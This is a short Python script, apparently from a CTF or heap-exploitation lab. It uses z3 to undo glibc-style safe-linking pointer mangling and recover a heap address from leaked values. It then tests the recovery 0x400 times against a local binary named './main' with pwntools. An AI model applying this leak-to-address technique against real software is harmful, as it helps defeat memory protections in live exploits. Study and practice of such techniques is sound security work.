from z3 import *
def XxX(leaked, off):
    leaked = BitVecVal(leaked, 48)
    off  = BitVecVal(off,48)

    res  = BitVec('res', 48)
    sss  = BitVec('sss', 48)

    s = Solver()

    s.add((sss>>12)^res==leaked)
    s.add((sss>>12)-(res>>12)==off)
    s.add((res>>40)<=0x7f)
    s.add((res>>40)>=0)

    if str(s.check()) == 'sat':
        m = s.model()
        return  m.evaluate(res).as_long() & 0xfffffffff000
    else:
        print(s.check())
        exit(1)
def recv_num():
    data = p.readline()
    if(data==b"(nil)\n"):
        return 0
    return int(data,16)
if __name__ == "__main__":
    from pwn import *
    ct = 0
    total = 0x400
    for x in range(total):
        p = process("./main")
        leaked = recv_num()
        off = recv_num()
        res = XxX(leaked,off)
        print(hex(res))

        p.send(p64(res))
        res = p.read()
        if b'Success\n' != res:
            ct+=1
        p.close()
    print("ALL DONE")
    print(f"Success on {total-ct}/{total}")
